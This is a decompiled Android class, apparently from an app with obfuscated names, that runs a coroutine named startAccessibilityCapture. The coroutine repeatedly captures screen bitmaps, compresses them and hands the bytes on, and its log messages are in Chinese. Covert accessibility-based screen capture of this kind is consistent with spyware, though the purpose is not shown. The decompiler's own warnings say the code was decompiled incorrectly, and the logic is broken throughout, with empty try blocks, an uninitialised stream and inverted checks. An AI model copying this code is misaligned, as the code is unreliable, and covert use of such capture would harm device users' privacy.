package com.storm.safe.rock.manager;

import android.graphics.Bitmap;
import android.os.Build;
import java.io.ByteArrayOutputStream;
import java.util.concurrent.CancellationException;
import java.util.concurrent.locks.ReentrantLock;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlinx.coroutines.AbstractC0780a0;
import p000.AbstractC1262tj;
import p000.C1180rh;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.uj1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.etzbzyzqxvqm$startAccessibilityCapture$1", m214403f = "etzbzyzqxvqm.kt", m214404l = {600, 630, 665, 676, 684}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class etzbzyzqxvqm$startAccessibilityCapture$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52167a1;

    /* renamed from: a2 */
    public int f52168a2;

    /* renamed from: a3 */
    public long f52169a3;

    /* renamed from: a4 */
    public Bitmap f52170a4;

    /* renamed from: a5 */
    public int f52171a5;

    /* renamed from: a6 */
    public final /* synthetic */ C0263a5 f52172a6;

    /* renamed from: a7 */
    public final /* synthetic */ long f52173a7;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public etzbzyzqxvqm$startAccessibilityCapture$1(C0263a5 c0263a5, long j, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52172a6 = c0263a5;
        this.f52173a7 = j;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new etzbzyzqxvqm$startAccessibilityCapture$1(this.f52172a6, this.f52173a7, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((etzbzyzqxvqm$startAccessibilityCapture$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Can't wrap try/catch for region: R(10:23|(3:169|24|25)|127|(1:129)(1:130)|131|132|165|135|(3:138|139|140)|147) */
    /* JADX WARN: Can't wrap try/catch for region: R(6:195|46|47|185|48|(8:194|79|(9:81|161|82|(1:95)(4:84|(5:159|86|(1:88)|91|94)|93|94)|96|(8:167|100|171|101|(1:103)(1:106)|107|108|(2:(0)(5:124|(1:126)|127|(0)(0)|131)|147)(1:120))|115|(2:117|119)|(1:122))|132|165|135|(0)|147)(10:179|52|(1:54)(1:55)|56|182|57|(2:177|63)|67|68|(3:191|70|147)(4:71|72|199|197))) */
    /* JADX WARN: Code restructure failed: missing block: B:141:0x01ca, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:142:0x01cb, code lost:
    
        r15 = r13;
     */
    /* JADX WARN: Code restructure failed: missing block: B:146:0x01e6, code lost:
    
        if (p000.b81.m210571b1(500, r17) != r2) goto L148;
     */
    /* JADX WARN: Code restructure failed: missing block: B:77:0x0101, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:78:0x0102, code lost:
    
        r13 = r18;
     */
    /* JADX WARN: Path cross not found for [B:115:0x016d, B:167:0x013b], limit reached: 192 */
    /* JADX WARN: Path cross not found for [B:117:0x0170, B:121:0x017a], limit reached: 192 */
    /* JADX WARN: Path cross not found for [B:122:0x017c, B:132:0x01ad], limit reached: 192 */
    /* JADX WARN: Path cross not found for [B:159:0x011b, B:93:0x012c], limit reached: 192 */
    /* JADX WARN: Path cross not found for [B:81:0x010a, B:132:0x01ad], limit reached: 192 */
    /* JADX WARN: Removed duplicated region for block: B:129:0x01a4  */
    /* JADX WARN: Removed duplicated region for block: B:130:0x01a5 A[Catch: CancellationException -> 0x0045, Exception -> 0x0058, TryCatch #8 {Exception -> 0x0058, blocks: (B:81:0x010a, B:96:0x0130, B:98:0x0135, B:117:0x0170, B:120:0x0174, B:122:0x017c, B:124:0x0184, B:127:0x019f, B:131:0x01aa, B:130:0x01a5, B:114:0x016a, B:133:0x01b0, B:134:0x01b3, B:24:0x0050), top: B:169:0x0050 }] */
    /* JADX WARN: Removed duplicated region for block: B:138:0x01c3  */
    /* JADX WARN: Removed duplicated region for block: B:157:0x0080 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        int i;
        int i2;
        int i3;
        Bitmap bitmapM211345a2;
        Object objM213696a7;
        long jMax;
        long j;
        byte[] bArr;
        Bitmap bitmap;
        byte[] byteArray;
        ByteArrayOutputStream byteArrayOutputStream;
        Bitmap bitmapCopy;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = this.f52171a5;
        long j2 = 500;
        int i5 = 2;
        try {
            if (i4 != 0) {
                try {
                } catch (Exception e) {
                    e = e;
                    i = 5;
                }
                if (i4 == 1) {
                    int i6 = this.f52168a2;
                    i2 = this.f52167a1;
                    kg1.m213544f4(obj);
                    i = i6;
                } else if (i4 == 2) {
                    int i7 = this.f52168a2;
                    i2 = this.f52167a1;
                    kg1.m213544f4(obj);
                    i = i7;
                    j2 = 500;
                } else {
                    if (i4 == 3) {
                        long j3 = this.f52169a3;
                        i = this.f52168a2;
                        i3 = this.f52167a1;
                        bitmapM211345a2 = this.f52170a4;
                        try {
                            kg1.m213544f4(obj);
                            objM213696a7 = obj;
                            jMax = j3;
                        } catch (Exception e2) {
                            e = e2;
                            i2 = i3;
                            t60.m214705c6("etzbzyzqxvqm", "捕获循环错误(非截图)", e);
                            this.f52170a4 = null;
                            this.f52167a1 = i2;
                            this.f52168a2 = i;
                            this.f52171a5 = 5;
                            j = 500;
                        }
                        bArr = (byte[]) objM213696a7;
                        if (bArr.length == 0) {
                            C0263a5.m211346a3(this.f52172a6, bArr);
                        }
                        bitmapM211345a2.recycle();
                        int i8 = i;
                        this.f52170a4 = null;
                        this.f52167a1 = i3;
                        this.f52168a2 = i8;
                        this.f52171a5 = 4;
                        if (b81.m210571b1(jMax, this) != coroutineSingletons) {
                            i = i8;
                            i2 = i3;
                            j2 = 500;
                            i5 = 2;
                        }
                        return coroutineSingletons;
                    }
                    if (i4 == 4) {
                        int i9 = this.f52168a2;
                        int i10 = this.f52167a1;
                        try {
                            kg1.m213544f4(obj);
                            i = i9;
                            i2 = i10;
                        } catch (Exception e3) {
                            e = e3;
                            i = i9;
                            i2 = i10;
                            t60.m214705c6("etzbzyzqxvqm", "捕获循环错误(非截图)", e);
                            this.f52170a4 = null;
                            this.f52167a1 = i2;
                            this.f52168a2 = i;
                            this.f52171a5 = 5;
                            j = 500;
                        }
                        j2 = 500;
                        i5 = 2;
                    } else {
                        if (i4 != 5) {
                            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                        }
                        int i11 = this.f52168a2;
                        i2 = this.f52167a1;
                        try {
                            kg1.m213544f4(obj);
                            j = 500;
                            i = i11;
                            j2 = j;
                            i5 = 2;
                        } catch (CancellationException unused) {
                            t60.m214702c3("etzbzyzqxvqm", "📺 捕获协程已取消");
                        } catch (Exception e4) {
                            t60.m214705c6("etzbzyzqxvqm", "❌ 捕获协程异常终止", e4);
                            this.f52172a6.f52152a1 = false;
                        }
                    }
                }
            } else {
                kg1.m213544f4(obj);
                i = 8;
                i2 = 0;
            }
            while (this.f52172a6.f52152a1) {
                try {
                } catch (Exception e5) {
                    e = e5;
                }
                if (this.f52172a6.f52153a2) {
                    try {
                    } catch (Exception e6) {
                        e = e6;
                        t60.m214705c6("etzbzyzqxvqm", "捕获循环错误(非截图)", e);
                        this.f52170a4 = null;
                        this.f52167a1 = i2;
                        this.f52168a2 = i;
                        this.f52171a5 = 5;
                        j = 500;
                    }
                    this.f52167a1 = i2;
                    this.f52168a2 = i;
                    this.f52171a5 = 1;
                    if (b81.m210571b1(j2, this) == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                } else {
                    Bitmap bitmapM211343a0 = C0263a5.m211343a0(this.f52172a6);
                    int i12 = i2;
                    jMax = Math.max(this.f52173a7, this.f52172a6.f52157a6);
                    if (bitmapM211343a0 == null || bitmapM211343a0.isRecycled()) {
                        i3 = i12 + 1;
                        if (i3 >= 3) {
                            C0263a5 c0263a5 = this.f52172a6;
                            c0263a5.f52160a9.lock();
                            try {
                                Bitmap bitmap2 = c0263a5.f52158a7;
                                if (bitmap2 == null) {
                                    bitmap = null;
                                } else {
                                    if (!bitmap2.isRecycled()) {
                                        Bitmap.Config config = bitmap2.getConfig();
                                        if (config == null) {
                                            config = Bitmap.Config.ARGB_8888;
                                        }
                                        bitmapCopy = bitmap2.copy(config, false);
                                        bitmap = bitmapCopy;
                                    }
                                    bitmapCopy = null;
                                    bitmap = bitmapCopy;
                                }
                                if (bitmap != null && !bitmap.isRecycled()) {
                                    try {
                                        try {
                                        } catch (Exception unused2) {
                                            bitmap.recycle();
                                        }
                                        bitmap.compress(Build.VERSION.SDK_INT >= 30 ? Bitmap.CompressFormat.WEBP_LOSSY : Bitmap.CompressFormat.WEBP, C0263a5.f52144b0.getCaptureQuality(), byteArrayOutputStream);
                                        byteArray = byteArrayOutputStream.toByteArray();
                                        byteArrayOutputStream.close();
                                        bitmap.recycle();
                                        if (byteArray != null || byteArray.length == 0) {
                                            if (i3 < i && (bitmapM211345a2 = C0263a5.m211345a2(this.f52172a6)) != null) {
                                                C1180rh c1180rh = AbstractC1262tj.f60233a0;
                                                etzbzyzqxvqm$startAccessibilityCapture$1$testData$1 etzbzyzqxvqm_startaccessibilitycapture_1_testdata_1 = new etzbzyzqxvqm$startAccessibilityCapture$1$testData$1(this.f52172a6, bitmapM211345a2, null);
                                                this.f52170a4 = bitmapM211345a2;
                                                this.f52167a1 = i3;
                                                this.f52168a2 = i;
                                                this.f52169a3 = jMax;
                                                this.f52171a5 = 3;
                                                objM213696a7 = AbstractC0780a0.m213696a7(c1180rh, etzbzyzqxvqm_startaccessibilitycapture_1_testdata_1, this);
                                                if (objM213696a7 == coroutineSingletons) {
                                                }
                                                bArr = (byte[]) objM213696a7;
                                                if (bArr.length == 0) {
                                                }
                                                bitmapM211345a2.recycle();
                                            }
                                            return coroutineSingletons;
                                        }
                                        C0263a5.m211346a3(this.f52172a6, byteArray);
                                    } catch (Throwable th) {
                                        try {
                                            throw th;
                                        } finally {
                                        }
                                    }
                                    byteArrayOutputStream = new ByteArrayOutputStream();
                                }
                                byteArray = null;
                                if (byteArray != null) {
                                }
                                if (i3 < i) {
                                }
                            } finally {
                            }
                        }
                        int i82 = i;
                        this.f52170a4 = null;
                        this.f52167a1 = i3;
                        this.f52168a2 = i82;
                        this.f52171a5 = 4;
                        if (b81.m210571b1(jMax, this) != coroutineSingletons) {
                        }
                        return coroutineSingletons;
                    }
                    try {
                    } catch (Exception e7) {
                        e = e7;
                        i2 = 0;
                        t60.m214705c6("etzbzyzqxvqm", "捕获循环错误(非截图)", e);
                        this.f52170a4 = null;
                        this.f52167a1 = i2;
                        this.f52168a2 = i;
                        this.f52171a5 = 5;
                        j = 500;
                    }
                    byte[] bArrM211344a1 = C0263a5.m211344a1(this.f52172a6, bitmapM211343a0);
                    if (bArrM211344a1.length != 0) {
                        C0263a5.m211346a3(this.f52172a6, bArrM211344a1);
                    }
                    C0263a5 c0263a52 = this.f52172a6;
                    ReentrantLock reentrantLock = c0263a52.f52160a9;
                    reentrantLock.lock();
                    try {
                        Bitmap bitmap3 = c0263a52.f52158a7;
                        if (bitmap3 != null && !bitmap3.equals(bitmapM211343a0) && !bitmap3.isRecycled()) {
                            try {
                                bitmap3.recycle();
                            } catch (Exception unused3) {
                            }
                        }
                        c0263a52.f52158a7 = bitmapM211343a0;
                        System.currentTimeMillis();
                        uj1 uj1Var = C0263a5.f52144b0;
                        reentrantLock.unlock();
                        this.f52167a1 = 0;
                        this.f52168a2 = i;
                        this.f52171a5 = i5;
                        if (b81.m210571b1(jMax, this) == coroutineSingletons) {
                            return coroutineSingletons;
                        }
                        i2 = 0;
                        j2 = 500;
                    } finally {
                    }
                }
                while (this.f52172a6.f52152a1) {
                }
            }
            return C1351vv.f60710b1;
        } catch (CancellationException e8) {
            t60.m214702c3("etzbzyzqxvqm", "📺 捕获循环已取消");
            throw e8;
        }
    }
}
